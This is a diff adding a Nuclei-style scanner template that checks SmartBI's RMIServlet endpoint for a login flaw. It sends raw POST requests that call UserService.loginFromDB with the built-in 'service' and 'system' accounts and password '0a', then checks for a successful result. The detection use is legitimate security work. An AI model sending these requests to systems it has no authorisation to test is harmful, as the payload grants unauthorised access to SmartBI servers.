@@ -1,0 +1,43 @@
+id: smartbi-bi-idor-ct-765607
+
+info:
+  name: SmartBI IDOR Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an IDOR vulnerability in SmartBI's RMIServlet endpoint.
+  reference:
+    - https://www.smartbi.com.cn/patchinfo
+
+variables:
+  u0: "service"
+  u1: "system"
+
+http:
+  - raw:
+      - |
+        POST /smartbi/vision/RMIServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=loginFromDB&params=["{{u0}}","0a"]
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"result":true'
+
+  - raw:
+      - |
+        POST /vision/RMIServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=loginFromDB&params=["{{u1}}","0a"]
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"result":true'
